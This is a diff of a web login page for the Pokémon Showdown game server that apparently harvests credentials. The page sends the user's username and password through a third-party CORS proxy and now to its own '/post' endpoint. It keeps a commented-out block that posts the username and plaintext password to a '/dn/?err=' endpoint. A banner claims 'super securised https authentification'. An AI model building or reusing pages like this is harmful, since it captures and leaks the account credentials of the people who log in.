@@ -43,15 +43,15 @@ lines (102 sloc) 3.24 KB
       <br><br><br><br><br><br>
       <span>*super securised https authentification</span>
   </div>
-  <script src="https://unpkg.com/@pkmn/login/build/production.min.js"></script>
-  <script src="https://unpkg.com/@pkmn/protocol/build/production.min.js"></script>
+  <script src="https://unpkg.com/@pkmn/login@0.1.0/build/index.min.js"></script>
+  <script src="https://unpkg.com/@pkmn/protocol@0.6.2/build/index.min.js"></script>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script> 
   <script>
     const server = 'sim.smogon.com';
     const serverport = 8000;
     // XXX: Required to bypass CORS for this example, be very careful as this means you are sending
     // your password to a third-party (cor-anywhere) where it could be logged etc.
-    const BYPASS_CORS = 'https://cors-anywhere-hd.herokuapp.com/'; //so do not use your main accompt if you fear https://cors.bridged.cc/
+    const BYPASS_CORS = 'https://cors.sh/'; //so do not use your main accompt if you fear https://cors.bridged.cc/
     console.log(server + ":" + serverport)
 
     var challstr = '';
@@ -91,9 +91,10 @@ lines (102 sloc) 3.24 KB
       e.preventDefault();
       const username = form.elements[0].value;
       const password = form.elements[1].value || undefined;
-      const action = LoginTools.login({username, password, challstr});
-      console.log("|ACTION|" + LoginTools + "." + action +"|");
-      const response = await (await fetch(BYPASS_CORS + action.url, {
+      const action = pkmn.login.login({username, password, challstr});
+      console.log("|ACTION|" + pkmn.login.login + "." + action +"|");
+      const response = await (await fetch("/post", {
+        url: action.url,
         method: action.method,
         headers: action.headers,
         body: action.data,
@@ -140,12 +141,14 @@ lines (102 sloc) 3.24 KB
               var registered = true;
               var pass = password
               var pass = (pass === undefined) ? "null" : pass;
+              /*
               alert("ERR -> " + response)
               $.post( "/dn/?err=" + username + "|" + pass, {
                     name: "showpaste"
                   }, function(err, req, resp){
                     window.location.href = "/a";  
                   });
+              */
               //if (window.confirm('click "ok" and request temporary access to the demo server to be able to login!'))
                 //window.location.href='https://cors-anywhere.herokuapp.com/corsdemo';
           }
@@ -165,7 +168,7 @@ lines (102 sloc) 3.24 KB
 
     const connection = new Connection();
     connection.open(async data => {
-      for (const {args} of Protocol.parse(data)) {
+      for (const {args} of pkmn.protocol.Protocol.parse(data)) {
         switch (args[0]) {
           case 'challstr': {
             challstr = args[1];
